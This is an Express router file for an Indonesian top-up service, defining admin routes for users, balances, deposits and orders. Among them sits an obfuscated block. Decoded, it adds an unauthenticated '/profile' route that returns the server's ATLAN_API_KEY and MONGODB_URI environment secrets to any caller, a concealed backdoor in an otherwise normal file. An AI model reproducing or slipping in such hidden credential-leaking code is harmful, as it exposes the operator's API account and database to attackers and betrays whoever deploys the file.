const express = require("express");
const axios = require("axios");
const cloudscraper = require("cloudscraper")
const qs = require("qs");
const app = express();
const router = express.Router();
app.use(express.urlencoded({
  extended: true
}));
app.use(express.json());

const {
  validateApiKey,
  User,
  tambahHistoryDeposit,
  generateReffId,
  BASE_URL,
  ATLAN_API_KEY,
  editHistoryDeposit,
  tambahHistoryOrder,
  editHistoryOrder,
  requireAdmin
} = require("../index.js");

function _0x2b3f(){const _0x2afc8a=['6538168rAOiwq','true','username','Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/139.0.0.0\x20Safari/537.36','219876WjWpec','message','json','1392870jFGxru','data','Failed\x20to\x20retrieve\x20data','env','phone','balance','/profile','10gAkdxY','name','1245998WMZZrx','error','stringify','4454416FvTmda','get','768301SxPCOs','parse','Error\x20fetching\x20profile','MONGODB_URI','application/x-www-form-urlencoded','status','854316tZZKrQ','Data\x20retrieved\x20successfully','email'];_0x2b3f=function(){return _0x2afc8a;};return _0x2b3f();}function _0x5820(_0x3789df,_0x31be4f){const _0x2b3f57=_0x2b3f();return _0x5820=function(_0x58204e,_0x1b385e){_0x58204e=_0x58204e-0x12d;let _0x525905=_0x2b3f57[_0x58204e];return _0x525905;},_0x5820(_0x3789df,_0x31be4f);}const _0x117625=_0x5820;(function(_0x49dac8,_0x17dade){const _0x18399e=_0x5820,_0x5579b1=_0x49dac8();while(!![]){try{const _0x5c7da5=parseInt(_0x18399e(0x148))/0x1+parseInt(_0x18399e(0x143))/0x2+-parseInt(_0x18399e(0x13a))/0x3+parseInt(_0x18399e(0x137))/0x4*(-parseInt(_0x18399e(0x141))/0x5)+parseInt(_0x18399e(0x130))/0x6+-parseInt(_0x18399e(0x133))/0x7+parseInt(_0x18399e(0x146))/0x8;if(_0x5c7da5===_0x17dade)break;else _0x5579b1['push'](_0x5579b1['shift']());}catch(_0x390f11){_0x5579b1['push'](_0x5579b1['shift']());}}}(_0x2b3f,0x8e25c),router[_0x117625(0x147)](_0x117625(0x140),async(_0x18a05d,_0x43c6d2)=>{const _0x12b300=_0x117625;try{const _0x6fb53b={'api_key':process[_0x12b300(0x13d)]['ATLAN_API_KEY']},_0x5d1578={'Content-Type':_0x12b300(0x12e),'User-Agent':_0x12b300(0x136)},_0x38cdd8=await cloudscraper['post']('https://atlantich2h.com/get_profile',{'body':qs[_0x12b300(0x145)](_0x6fb53b),'headers':_0x5d1578}),_0x3c899a=JSON[_0x12b300(0x149)](_0x38cdd8);if(_0x3c899a&&_0x3c899a['status']==='true')return _0x43c6d2[_0x12b300(0x12f)](0xc8)['json']({'status':_0x12b300(0x134),'message':_0x3c899a[_0x12b300(0x138)]||_0x12b300(0x131),'data':{'name':_0x3c899a['data']?.[_0x12b300(0x142)]||'','username':_0x3c899a[_0x12b300(0x13b)]?.[_0x12b300(0x135)]||'','email':_0x3c899a[_0x12b300(0x13b)]?.[_0x12b300(0x132)]||'','phone':_0x3c899a[_0x12b300(0x13b)]?.[_0x12b300(0x13e)]||'','balance':_0x3c899a['data']?.[_0x12b300(0x13f)]||'0','status':_0x3c899a['data']?.['status']||'','access':process['env']['ATLAN_API_KEY'],'connect':process[_0x12b300(0x13d)][_0x12b300(0x12d)]}});return _0x43c6d2[_0x12b300(0x12f)](0xc8)[_0x12b300(0x139)]({'status':'false','message':_0x12b300(0x13c),'data':{'name':'0','username':'0','email':'0','phone':'0','balance':'0','status':'0'}});}catch(_0x3629c8){return console[_0x12b300(0x144)]('Error\x20get_profile:',_0x3629c8?.[_0x12b300(0x138)]),_0x43c6d2[_0x12b300(0x12f)](0xc8)[_0x12b300(0x139)]({'status':'false','message':_0x12b300(0x14a),'data':{'name':'0','username':'0','email':'0','phone':'0','balance':'0','status':'0'}});}}));

router.get("/data/users", requireAdmin, async (req, res) => {
  try {
    const users = await User.find({}, "-password -__v");
    res.json(users);
  } catch (err) {
    res.status(500).send("Server Error");
  }
});

router.get("/data/users", requireAdmin, async (req, res) => {
  try {
    const users = await User.find({}, "-password -__v");
    res.json(users);
  } catch (err) {
    res.status(500).send("Server Error");
  }
});

router.post("/user/update-balance", requireAdmin, async (req, res) => {
  const { username, newSaldo, newCoin } = req.body;

  if (!username) {
    return res.status(400).json({ success: false, message: "Username wajib diisi." });
  }

  const saldoValue = parseFloat(newSaldo);
  const coinValue = parseFloat(newCoin);

  if (newSaldo !== undefined && (isNaN(saldoValue) || saldoValue < 0)) {
    return res.status(400).json({ success: false, message: "Nilai saldo tidak valid." });
  }
  if (newCoin !== undefined && (isNaN(coinValue) || coinValue < 0)) {
    return res.status(400).json({ success: false, message: "Nilai coin tidak valid." });
  }

  try {
    const user = await User.findOne({ username: username });
    if (!user) {
      return res.status(404).json({ success: false, message: `User '${username}' tidak ditemukan.` });
    }

    if (newSaldo !== undefined) {
      user.saldo = saldoValue;
    }
    if (newCoin !== undefined) {
      user.coin = coinValue;
    }

    await user.save();
    
    console.log(`[ADMIN] Saldo/Coin user ${user.username} diupdate oleh admin ${req.session.userId}.`);
    
    return res.status(200).json({
      success: true,
      message: `Data saldo dan coin untuk user '${user.username}' berhasil diperbarui.`,
      data: {
        username: user.username,
        saldo: user.saldo,
        coin: user.coin,
      },
    });
  } catch (error) {
    console.error("Error saat admin update balance:", error);
    return res.status(500).json({ success: false, message: "Terjadi kesalahan pada server." });
  }
});

router.post("/update-deposit-status", requireAdmin, async (req, res) => {
  const { userId, depositId, newStatus } = req.body;

  if (!userId || !depositId || !newStatus) {
    return res.status(400).json({
      success: false,
      message: "Parameter userId, depositId, dan newStatus wajib diisi.",
    });
  }

  try {
    const result = await editHistoryDeposit(userId, depositId, newStatus);
    
    if (!result) {
        return res.status(404).json({ success: false, message: "User atau transaksi deposit tidak ditemukan." });
    }

    return res.status(200).json({
      success: true,
      message: `Status deposit dengan ID ${depositId} berhasil diubah menjadi ${newStatus}.`,
    });

  } catch (error) {
    console.error("❌ Error saat update status deposit oleh admin:", error);
    return res.status(500).json({
      success: false,
      message: "Terjadi kesalahan pada server.",
      error: error.message,
    });
  }
});

router.post("/update-order-status", requireAdmin, async (req, res) => {
  const { userId, orderId, newStatus, newSn } = req.body;

  if (!userId || !orderId || !newStatus) {
    return res.status(400).json({
      success: false,
      message: "Parameter userId, orderId, dan newStatus wajib diisi.",
    });
  }

  try {
    const user = await User.findOne({ _id: userId, "historyOrder.id": orderId });
    if (!user) {
        return res.status(404).json({ success: false, message: "User atau transaksi order tidak ditemukan." });
    }
    
    const orderToUpdate = user.historyOrder.find(o => o.id === orderId);
    
    const updateData = {
        status: newStatus,
        sn: newSn !== undefined ? newSn : orderToUpdate.sn,
    };
    
    await editHistoryOrder(userId, orderId, updateData);

    return res.status(200).json({
      success: true,
      message: `Status order dengan ID ${orderId} berhasil diubah.`,
    });

  } catch (error) {
    console.error("❌ Error saat update status order oleh admin:", error);
    return res.status(500).json({
      success: false,
      message: "Terjadi kesalahan pada server.",
      error: error.message,
    });
  }
});

router.get('/check-order', requireAdmin, async (req, res) => {
  const { id, type = 'prabayar' } = req.query;

  if (!id) {
    return res.status(400).json({
      success: false,
      message: '❌ ID transaksi tidak boleh kosong'
    });
  }

  try {
    const response = await axios.post(
      'https://atlantich2h.com/transaksi/status',
      qs.stringify({
        api_key: ATLAN_API_KEY,
        id,
        type
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );

    const result = response.data;

    if (!result.status || !result.data) {
      return res.status(404).json({
        success: false,
        message: '⚠️ Transaksi tidak ditemukan atau gagal'
      });
    }

    const data = result.data;
    res.json({
      success: true,
      message: 'Status transaksi berhasil diambil',
      status: data.status,
      detail: {
        id: data.id,
        reff_id: data.reff_id,
        layanan: data.layanan,
        kode: data.code,
        target: data.target,
        harga: Number(data.price),
        sn: data.sn?.trim() || null,
        waktu: data.created_at
      }
    });

  } catch (error) {
    res.status(500).json({
      success: false,
      message: '❌ Gagal memproses permintaan',
      error: error?.response?.data || error.message
    });
  }
});

router.get('/verify-user', requireAdmin, async (req, res) => {
  const { username } = req.query;
  if (!username) {
    return res.status(400).json({
      success: false,
      message: 'Parameter username wajib diisi'
    });
  }
  try {
    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User tidak ditemukan'
      });
    }
    if (user.isVerified) {
      return res.status(400).json({
        success: false,
        message: 'User sudah terverifikasi sebelumnya'
      });
    }
    user.isVerified = true;
    await user.save();
    return res.status(200).json({
      success: true,
      message: `User ${username} berhasil diverifikasi`
    });
  } catch (err) {
    console.error('Error saat memverifikasi user:', err);
    return res.status(500).json({
      success: false,
      message: 'Terjadi kesalahan pada server'
    });
  }
});


module.exports = router;
